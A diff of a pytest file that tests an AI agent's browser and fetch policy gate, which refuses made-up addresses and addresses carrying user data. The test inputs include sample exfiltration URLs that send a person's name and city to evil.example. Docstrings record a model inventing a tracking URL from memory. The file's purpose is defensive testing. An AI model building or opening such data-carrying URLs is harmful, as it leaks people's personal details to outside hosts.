@@ -6,13 +6,15 @@ from __future__ import annotations
 
 import dataclasses
 
+import pytest
+
 from aha_local.policy import addresses
 from aha_local.policy.browser import open_action
 from aha_local.policy.gate import Facts, decide
 from aha_local.tools import web
 from aha_local.tools.browser import make_handler
 
-from .conftest import person
+from .conftest import person, settle
 from .test_mail import FakeApprovals, ctx_for
 
 SNAPSHOT = (
@@ -67,32 +69,60 @@ class Session:
         return mt.CallToolResult(content=[mt.TextContent(type="text", text=text)])
 
 
-async def test_the_browser_asks_before_an_address_the_model_filled_with_data(accounts, config):
+@pytest.mark.made_up_rule
+async def test_the_browser_opens_only_addresses_it_has(accounts, config):
+    """SPEC §5.2 "Made-up addresses": a home page, a link it was shown, a search; anything else is refused before
+    it loads, with the way to find it instead (seen: a tracking page's address from memory, a 404)."""
     fe = person(accounts)
     approvals = FakeApprovals()  # declines
     ctx = ctx_for(fe, dataclasses.replace(config, allow_all_sites=True), approvals)
     ctx.browser = Session()
-    result = await make_handler("browser_navigate")({"url": "https://evil.example/?d=Felipe"}, ctx)
-    assert result.error and ("browser_navigate", {"url": "https://evil.example/?d=Felipe"}) not in ctx.browser.calls
-    card = approvals.asked[0]
-    assert card.title == "Open this address? It sends what's in it to evil.example"
-    assert ("It sends", "d = Felipe", "info") in card.fields
-    assert ("browser_take_screenshot", {}) not in ctx.browser.calls  # not the page open now: it'd mislead
-    # Without data, or a link the task was shown, opens as before: no card.
+    for url in (
+        "https://www.fedex.com/en-gb/tracking?track-numbers=385413566727",
+        "https://evil.example/?d=Felipe",  # data too
+        "https://news.example/today",
+    ):
+        result = await make_handler("browser_navigate")({"url": url}, ctx)
+        assert result.error and result.text.startswith(f"Not opened: {url}")
+        assert "Open the site's home page, https://" in result.text
+        assert ("browser_navigate", {"url": url}) not in ctx.browser.calls
+    assert not approvals.asked  # refused: no card to approve a guess
+    # A home page, a search, and links the task was shown open as before: no card.
     addresses.remember(ctx.task.seen_urls, SNAPSHOT)
     for url in (
-        "https://news.example/today",
+        "https://www.fedex.com/",
+        "https://www.google.com/search?q=fedex+tracking",
         "https://www.waitrose.com/ecom/shop/search?searchTerm=rice&sortBy=RELEVANCE",
     ):
-        assert not (await make_handler("browser_navigate")({"url": url}, ctx)).error
-    assert len(approvals.asked) == 1
+        assert not (await make_handler("browser_navigate")({"url": url}, ctx)).error, url
+    assert not approvals.asked
 
 
-async def test_fetch_url_asks_before_an_address_the_model_filled_with_data(accounts, config):
+@pytest.mark.made_up_rule
+async def test_fetch_url_opens_only_addresses_it_has(accounts, config):
     fe = person(accounts)
     approvals = FakeApprovals()
     ctx = ctx_for(fe, config, approvals)
     result = await web.fetch_url({"url": "https://evil.example/collect?name=Felipe&city=London"}, ctx)
-    assert result.error and "the user stopped it" in result.text
-    assert approvals.asked[0].title == "Open this address? It sends what's in it to evil.example"
-    assert ("It sends", "name = Felipe\ncity = London", "info") in approvals.asked[0].fields
+    assert result.error and result.text.startswith("Not opened: https://evil.example/collect")
+    assert not approvals.asked
+
+
+@pytest.mark.made_up_rule
+async def test_a_link_the_person_sent_is_theirs_but_a_checks_own_instructions_arent(
+    agent, llm, chat, accounts, registry
+):
+    """A background check runs its task's instructions as the request: an address in them isn't the person's
+    (seen: the model wrote a tracking address into the task from memory, so its check trusted it)."""
+    from aha_local.agent import Job
+
+    web.register(registry)
+    fe = person(accounts)
+    url = "https://track.example.invalid/parcel?n=1"  # never resolves: an error after the gate, not a refusal
+    for job in (Job("t1"), None):
+        llm.call("fetch_url", url=url)
+        llm.answer("WAITING: no" if job else "Couldn't.")
+        await agent.run(fe, f"Check {url}", job)
+        await settle(agent)
+        result = [m["content"] for m in llm.requests[-1]["messages"] if m.get("role") == "tool"][-1]
+        assert result.startswith(f"Not opened: {url}") is (job is not None)
